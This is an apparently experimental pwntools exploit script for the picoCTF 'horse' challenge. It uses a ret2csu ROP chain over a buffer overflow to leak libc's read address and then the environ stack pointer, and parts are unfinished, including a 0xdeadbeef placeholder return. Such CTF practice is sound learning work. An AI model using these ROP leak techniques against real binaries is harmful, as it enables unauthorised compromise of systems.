from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'error'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0
leave_ret = 0x400b96 

def leak_read():
    heap_stack = 0x602080 # Try slightly deeper
    payload = b'A' * 32
    payload += b'B' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_read) + p64(0) + p64(heap_stack) + p64(0x500)
    payload += p64(csu_call)
    payload += b'J' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(heap_stack) + p64(0) * 4 + p64(leave_ret) 

    r.sendline(payload)
    r.recvuntil(b'/     /   \xc2\xb4\n')
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        print(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except:
        exit()

leaked_read = leak_read()

environ_addr = leaked_read + 0xde340

payload2 = b'J' * 8 
payload2 += p64(csu_pop) 

# write(1, environ_addr, 8)
payload2 += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(environ_addr) + p64(8)
payload2 += p64(csu_call)
payload2 += b'J' * 8 

payload2 += p64(0) * 6 
payload2 += p64(0xdeadbeef) 

print(f"Leaking environ: {hex(environ_addr)}")
r.sendline(payload2)

try:
    data = r.recvn(8)
    stack_leak = u64(data)
    print(f"Stack leak: {hex(stack_leak)}")
except Exception as e:
    print(f"Error: {e}")

r.close()
